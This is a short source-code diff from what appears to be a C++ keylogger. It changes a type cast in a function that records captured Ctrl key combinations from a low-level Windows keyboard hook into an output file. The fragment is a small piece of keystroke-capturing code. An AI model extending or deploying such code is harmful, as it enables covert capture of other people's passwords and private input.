@@ -19,7 +19,7 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
         }
         else
         {
-            out_file << L"[CTRL + " << static_cast<wchar_t>(kbd_hook->vkCode) << L"]";
+            out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook->vkCode) << L"]";
         }
     }
     else
